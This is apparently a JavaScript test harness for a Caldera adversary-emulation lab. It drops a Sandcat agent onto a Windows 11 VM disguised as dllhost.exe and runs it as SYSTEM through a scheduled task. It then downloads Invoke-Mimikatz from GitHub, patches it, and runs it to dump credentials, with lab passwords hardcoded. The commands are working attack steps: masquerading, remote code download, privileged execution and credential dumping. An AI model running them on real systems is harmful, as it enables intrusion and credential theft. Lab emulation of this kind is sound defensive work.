import { $ } from "bun"

const KALI_IP = "10.1.99.1"
const WIN11_IP = "10.1.99.24"
const KALI_SSH = "kali:kali"
const WINRM_AUTH = "localuser:password"
const CALDERA_URL = "http://10.1.99.1:8888"
const CALDERA_KEY = "ADMIN123"

async function sshRun(host, user, pass, command) {
  const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim()
    throw new Error(`SSH exit ${result.exitCode}: ${stderr || "no stderr"}`)
  }
  return result.stdout.toString().trim()
}

async function winrmRun(host, user, pass, command) {
  const py = `
import winrm
s = winrm.Session('${host}', auth=('${user}', '${pass}'), transport='ssl', server_cert_validation='ignore')
r = s.run_cmd('${command.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}')
print(r.std_out.decode())
if r.std_err.decode().strip():
    print(r.std_err.decode(), end='')
exit(r.status_code)
`
  const result = await $`uv run python -c ${py}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stdout = result.stdout.toString().trim()
    const stderr = result.stderr.toString().trim()
    throw new Error(`WinRM exit ${result.exitCode}: ${stdout || stderr || "no output"}`)
  }
  return result.stdout.toString().trim()
}

async function calderaApi(method, path, body) {
  const opts = {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    signal: AbortSignal.timeout(10000),
  }
  if (body !== undefined) opts.body = JSON.stringify(body)
  const res = await fetch(`${CALDERA_URL}${path}`, opts)
  return res.json()
}

async function calderaRest(method, body) {
  const res = await fetch(`${CALDERA_URL}/api/rest`, {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(10000),
  })
  return res.json()
}

async function testSshConnectivity() {
  console.log("\n=== SSH Connectivity (kali) ===")
  try {
    const user = await sshRun(KALI_IP, "kali", "kali", "whoami")
    console.log(`  PASS: whoami = ${user}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmConnectivity() {
  console.log("\n=== WinRM Connectivity (win11-22h2) ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "whoami")
    console.log(`  PASS: whoami = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testCalderaConnectivity() {
  console.log("\n=== Caldera API ===")
  try {
    const agents = await calderaRest("POST", { index: "agents" })
    console.log(`  PASS: agents endpoint reachable, ${agents.length} agents found`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testSandcatDeploy() {
  console.log("\n=== Sandcat Agent Deploy (win11) ===")
  const group = `test-${Date.now()}`
  try {
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`  Cleaned ${agents.length} stale agents`)
    } catch {}

    console.log("\n  [1] Network to Caldera")
    const netTest = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "Test-NetConnection -ComputerName 10.1.99.1 -Port 8888 -InformationLevel Quiet | ForEach-Object { if ($_) { Write-Host REACHABLE } else { Write-Host UNREACHABLE } }"')
    console.log(`  => 10.1.99.1:8888 ${netTest.trim()}`)

    console.log("\n  [2] Download sandcat.go -> C:\\Users\\Public\\dllhost.exe")
    const dl = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`  => ${dl.trim()}`)

    console.log("\n  [3] File check")
    const fileCheck = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "$f=Get-Item \'C:\\Users\\Public\\dllhost.exe\' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""')
    console.log(`  => ${fileCheck.trim()}`)

    console.log("\n  [4] Deploy sandcat via Scheduled Task as SYSTEM, wait 20s, check alive")
    const taskName = `CalderaSandcat-${group}`
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    } catch (err) {
      console.log(`  => task creation failed: ${err.message}`)
    }
    await new Promise(r => setTimeout(r, 20000))

    try {
      const tl = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "$p=Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' }; if ($p) { $wmi=Get-WmiObject Win32_Process -Filter \\"ProcessId=$($p.Id)\\"; $owner=$wmi.GetOwner(); Write-Host \\"RUNNING pid=$($p.Id) user=$($owner.User)\\" } else { Write-Host \\"DIED\\" }"')
      console.log(`  => process: ${tl.trim()}`)
    } catch (err) {
      console.log(`  => process check failed: ${err.message}`)
    }

    console.log("\n  [5] Caldera agents (after 20s wait):")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      console.log(`  => ${agents.length} agents:`)
      for (const a of agents) {
        console.log(`     paw=${a.paw} group=${a.group} trusted=${a.trusted}`)
      }
      const mine = agents.find(a => a.group === group)
      if (mine) {
        console.log(`  => MY agent CHECKED IN! paw=${mine.paw} trusted=${mine.trusted}`)
      } else {
        console.log(`  => MY agent (group=${group}) NOT found`)
        console.log("\n  [5b] Waiting another 15s, checking again...")
        await new Promise(r => setTimeout(r, 15000))
        const agents2 = await calderaRest("POST", { index: "agents" })
        const mine2 = agents2.find(a => a.group === group)
        if (mine2) {
          console.log(`  => MY agent CHECKED IN on retry! paw=${mine2.paw} trusted=${mine2.trusted}`)
        } else {
          console.log(`  => MY agent (group=${group}) STILL not found`)
          console.log(`  => agents now: ${agents2.map(a => `${a.paw}(${a.group})`).join(', ')}`)
        }
      }
    } catch (err) {
      console.log(`  => agents check failed: ${err.message}`)
    }

    console.log(`\n  [cleanup] Unregistering scheduled task ${taskName}`)
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("  => task cleaned up")
    } catch (err) {
      console.log(`  => task cleanup failed: ${err.message}`)
    }

    return true
  } catch (err) {
    console.log(`\n  UNEXPECTED FAIL: ${err.message}`)
    return false
  }
}

async function testFullPipeline() {
  console.log("\n=== Full Pipeline: Powerkatz (Staged) ===")

  const abilityId = "7049e3ec-b822-4fdf-a4ac-18190f9b66d1"
  const abilityName = "Powerkatz (Staged)"
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`

  const invokeMimiUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
  const invokeMimiPath = "C:\\Windows\\System32\\invoke-mimi.ps1"

  let agentPaw = null

  try {
    console.log(`\n  [1/5] Cleaning previous agents, processes, and tasks...`)
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`    Cleaned ${agents.length} stale agents`)
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-ScheduledTask -TaskName \'CalderaSandcat-*\' -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Host \'TASKS_CLEANED\'"')
    } catch {}
    console.log("    => clean")

    console.log(`\n  [2/5] Deploying sandcat as SYSTEM (group=${group})...`)
    const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`    => download: ${dlResult.trim()}`)
    await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    console.log("    => sandcat deployed via Scheduled Task")

    console.log(`\n  [3/5] Waiting for agent (group=${group})...`)
    const agentStart = Date.now()
    while (Date.now() - agentStart < 60000) {
      const agents = await calderaRest("POST", { index: "agents" })
      const agent = agents.find(a => a.group === group)
      if (agent) {
        agentPaw = agent.paw
        console.log(`    => Agent checked in: paw=${agent.paw} trusted=${agent.trusted} platform=${agent.platform} executors=${JSON.stringify(agent.executors)} (${Math.round((Date.now() - agentStart) / 1000)}s)`)
        break
      }
      await new Promise(r => setTimeout(r, 3000))
    }
    if (!agentPaw) throw new Error("Agent did not check in within 60s")

    console.log(`\n  [3b/5] Fetching ability "${abilityName}"...`)
    const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
    const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
    if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
    console.log(`    => platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)
    console.log(`    => command: ${ability.executors[0].command}`)
    console.log(`    => payloads: ${JSON.stringify(ability.executors[0].payloads)}`)

    console.log(`\n  [3c/5] Staging invoke-mimi.ps1 to C:\\Windows\\System32\\...`)
    const checkMimi = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "if (Test-Path '${invokeMimiPath}') { Write-Host 'EXISTS' } else { Write-Host 'MISSING' }"`)
    if (checkMimi.includes("MISSING")) {
      console.log(`    => Downloading Invoke-Mimikatz.ps1 from GitHub...`)
      try {
        await winrmRun(WIN11_IP, "localuser", "password",
          `powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '${invokeMimiUrl}' -OutFile '${invokeMimiPath}' -UseBasicParsing; Write-Host 'DEPLOYED'"`)
      } catch {}
      const verify = await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "$f=Get-Item '${invokeMimiPath}' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""`)
      console.log(`    => invoke-mimi.ps1: ${verify.trim()}`)
    } else {
      console.log(`    => Already present at ${invokeMimiPath}`)
    }

    console.log(`    => Patching invoke-mimi.ps1 line 886 (GetProcAddress reflection bug)...`)
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "$dest='${invokeMimiPath}'; $content=Get-Content $dest -Raw; $old='$UnsafeNativeMethods.GetMethod(''GetProcAddress'')'; $new='$UnsafeNativeMethods.GetMethod(''GetProcAddress'', [reflection.bindingflags] \\"Public,Static\\", \\$null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), \\$null)'; $patched=$content.Replace($old,$new); Set-Content $dest $patched -Encoding UTF8; Write-Host 'PATCHED'"`)
      console.log(`    => patch applied`)
    } catch (err) {
      console.log(`    => patch failed: ${err.message}`)
    }

    console.log(`\n  [3d/5] Diagnostic: verifying Caldera psh stdout capture...`)
    console.log(`    => Creating temp ability for Write-Output "CALDERA_STDOUT_TEST"...`)
    const diagPayload = {
      name: "Stdout Diag",
      tactic: "credential-access",
      technique_id: "T1003.001",
      technique_name: "OS Credential Dumping",
      ability_id: "ffff0000-0000-0000-0000-000000000001",
      executors: [{ name: "psh", platform: "windows", command: 'Write-Output "CALDERA_STDOUT_TEST"' }],
      repeatable: false,
      access: {},
      privilege: "",
      buckets: ["credential-access"],
      requirements: [],
    }
    try { await calderaApi("DELETE", "/api/v2/abilities/ffff0000-0000-0000-0000-000000000001") } catch {}
    await calderaApi("PUT", "/api/v2/abilities/ffff0000-0000-0000-0000-000000000001", diagPayload)
    const diagResult = await calderaApi("POST", "/plugin/access/exploit", { paw: agentPaw, ability_id: "ffff0000-0000-0000-0000-000000000001", obfuscator: "plain-text" })
    console.log(`    => /plugin/access/exploit result: ${JSON.stringify(diagResult).slice(0, 200)}`)
    let diagOutput = null
    const diagPollStart = Date.now()
    while (Date.now() - diagPollStart < 20000) {
      const ags = await calderaRest("POST", { index: "agents", paw: agentPaw })
      const ag = Array.isArray(ags) ? ags[0] : ags
      const links = ag?.links || []
      const diagLink = links.find(l => l.ability?.ability_id === "ffff0000-0000-0000-0000-000000000001")
      if (diagLink && diagLink.finish != null) {
        diagOutput = diagLink.output?.stdout || ""
        console.log(`    => diagnostic stdout: ${diagOutput ? diagOutput.slice(0, 200) : "(none)"}`)
        break
      }
      await new Promise(r => setTimeout(r, 2000))
    }
    if (diagOutput === null) console.log(`    => diagnostic link did not finish within 20s`)
    try { await calderaApi("DELETE", "/api/v2/abilities/ffff0000-0000-0000-0000-000000000001") } catch {}
    console.log(`    => stdout capture working: ${diagOutput ? "YES" : "NO"}`)

    console.log(`\n  [4/5] Exploiting agent with ability (iex invoke-mimi.ps1 + DumpCreds)...`)
    console.log(`    => Loads invoke-mimi.ps1 via iex (bypasses execution policy), then Invoke-Mimikatz -DumpCreds`)

    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw: agentPaw, ability_id: abilityId, obfuscator: "plain-text" })
    console.log(`    => /plugin/access/exploit result: ${JSON.stringify(exploitResult).slice(0, 200)}`)

    console.log(`    => Waiting for link (120s timeout)...`)
    let linkFacts = []
    let linkStatus = null
    let linkOutput = null
    const pollStart = Date.now()
    while (Date.now() - pollStart < 120000) {
      const agents = await calderaRest("POST", { index: "agents", paw: agentPaw })
      const ag = Array.isArray(agents) ? agents[0] : agents
      const links = ag?.links || []
      const mine = links.find(l => l.ability?.ability_id === abilityId)
      if (mine) {
        console.log(`    Link found: id=${mine.id} status=${mine.status} finish=${mine.finish}`)
        if (mine.finish != null) {
          console.log(`    Command: ${mine.command}`)
          console.log(`    Output (stdout): ${(mine.output?.stdout || "(none)").slice(0, 300)}`)
          console.log(`    Output (stderr): ${(mine.output?.stderr || "(none)").slice(0, 300)}`)
          console.log(`    Facts: ${JSON.stringify(mine.facts).slice(0, 300)}`)
          linkStatus = mine.status
          linkFacts = mine.facts || []
          linkOutput = mine.output?.stdout || ""
          break
        }
        console.log(`    Link pending (status=${mine.status}), waiting...`)
      }
      await new Promise(r => setTimeout(r, 2000))
    }

    console.log(`\n  [5/5] Reading mimi-out.txt via WinRM (Caldera stdout capture unreliable for mimikatz)...`)
    let mimiOutput = ""
    try {
      mimiOutput = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "if (Test-Path \'C:\\Windows\\Temp\\mimi-out.txt\') { Get-Content \'C:\\Windows\\Temp\\mimi-out.txt\' } else { Write-Host \'FILE_MISSING\' }"')
    } catch (err) {
      console.log(`    => failed to read mimi-out.txt: ${err.message}`)
    }
    console.log(`    => mimi-out.txt contents: ${mimiOutput.slice(0, 500)}`)

    console.log(`\n  [5b/5] Checking Caldera link facts (katz parser)...`)
    for (const f of linkFacts.slice(0, 15)) {
      console.log(`    fact: trait=${f.trait} value=${String(f.value).slice(0, 120)}`)
    }
    let katzFacts = 0
    for (const f of linkFacts) {
      if (f.trait && (f.trait.includes("password") || f.trait.includes("ntlm") || f.trait.includes("hash") || f.trait.includes("user.name"))) {
        katzFacts++
      }
    }
    console.log(`    => Katz-relevant facts: ${katzFacts}/${linkFacts.length}`)

    let fileHasCreds = false
    if (mimiOutput && !mimiOutput.includes("FILE_MISSING")) {
      const authenCount = (mimiOutput.match(/Authentication Id|authentication id/g) || []).length
      const ntlmCount = (mimiOutput.match(/NTLM|ntlm/g) || []).length
      const userCount = (mimiOutput.match(/User Name|user name|UserName|Username/g) || []).length
      const domainCount = (mimiOutput.match(/Domain|domain/g) || []).length
      console.log(`    => File patterns: AuthId=${authenCount} NTLM=${ntlmCount} User=${userCount} Domain=${domainCount}`)
      if ((authenCount > 0 || ntlmCount > 0) && !mimiOutput.includes("ERROR kuhl_m_sekurlsa_acquireLSA")) {
        fileHasCreds = true
      }
      if (mimiOutput.includes("ERROR kuhl_m_sekurlsa_acquireLSA")) {
        console.log(`    => mimikatz ERROR: kuhl_m_sekurlsa_acquireLSA (SeDebugPrivilege missing?)`)
      }
    } else {
      console.log(`    => mimi-out.txt missing or empty`)
    }

    const passed = fileHasCreds
    console.log(`\n  => Pipeline test: ${passed ? "PASSED" : "FAILED"} (file has creds=${fileHasCreds}, link status=${linkStatus})`)
    return passed
  } catch (err) {
    console.log(`\n  PIPELINE FAILED: ${err.message}`)
    return false
  } finally {
    console.log("\n  [cleanup] Removing agent, task, process, and PS1 file...")
    try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }); console.log("    agent deleted") } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
      console.log("    dllhost process killed")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("    scheduled task unregistered")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Remove-Item '${invokeMimiPath}' -Force -ErrorAction SilentlyContinue; Write-Host 'PS1_DELETED'"`)
      console.log("    invoke-mimi.ps1 deleted")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\mimi-out.txt\' -Force -ErrorAction SilentlyContinue; Write-Host \'TXT_DELETED\'"')
      console.log("    mimi-out.txt deleted")
    } catch {}
    console.log("    => cleanup complete")
  }
}

async function main() {
  console.log("testAbility — Powerkatz (Staged)\n")

  const results = {
    sshConnectivity: await testSshConnectivity(),
    winrmConnectivity: await testWinrmConnectivity(),
    calderaConnectivity: await testCalderaConnectivity(),
    sandcatDeploy: await testSandcatDeploy(),
    fullPipeline: await testFullPipeline(),
  }

  console.log("\n=== Summary ===")
  let pass = 0
  let fail = 0
  for (const [key, ok] of Object.entries(results)) {
    if (ok) { pass++; console.log(`  [PASS] ${key}`) }
    else { fail++; console.log(`  [FAIL] ${key}`) }
  }
  console.log(`\n  ${pass} passed, ${fail} failed`)
  console.log(`\n  Ability: Powerkatz (Staged)`)
  console.log(`  Ability ID: 7049e3ec-b822-4fdf-a4ac-18190f9b66d1`)
  console.log(`  invoke-mimi.ps1 staged to C:\\Windows\\System32\\ (agent working dir)`)
  console.log(`  Command: iex (Get-Content .\\invoke-mimi.ps1 -Raw); Invoke-Mimikatz -DumpCreds`)
  console.log(`  Verification: check stdout for credential patterns + katz parser facts`)
}

main().catch(console.error)
